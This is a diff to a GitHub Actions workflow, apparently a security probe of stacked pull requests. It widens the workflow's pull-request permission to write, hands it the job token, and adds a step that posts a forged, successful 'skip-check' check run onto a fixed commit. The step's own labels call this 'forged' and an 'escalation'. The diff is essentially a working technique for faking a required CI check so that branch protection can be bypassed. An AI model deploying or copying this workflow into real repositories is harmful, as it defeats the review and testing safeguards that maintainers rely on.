@@ -1,25 +1,29 @@
 name: skip probe
-
 on:
   pull_request_target:
     types: [opened, reopened, synchronize, edited]
     branches: [main]
   pull_request_review:
     types: [submitted]
-
 permissions:
   contents: read
-  pull-requests: read
+  pull-requests: write
   checks: write
-
 jobs:
   guard:
     name: skip-check
     runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      REPO: ${{ github.repository }}
     steps:
-      - name: Marker from the S2 head
+      - name: Forge a context on the bottom layer
         run: |
-          echo "COPY=HEAD-S2"
-          echo "pr=${{ github.event.pull_request.number }}"
-          echo "base=${{ github.event.pull_request.base.ref }}"
-          echo "event=${{ github.event_name }}"
+          set -euo pipefail
+          echo "COPY=HEAD-S2-ESCALATION"
+          gh api -X POST "repos/$REPO/check-runs" \
+            -f name=skip-check -f head_sha=f0e829ecd300d9c24574e57aa5c6ef7cca29d0b6 \
+            -f status=completed -f conclusion=success \
+            -f output[title]="forged from an interior layer" \
+            -f output[summary]="posted by s2's own copy of the workflow" \
+            --jq '"FORGED check-run \(.id) onto f0e829ec name=\(.name) conclusion=\(.conclusion)"'
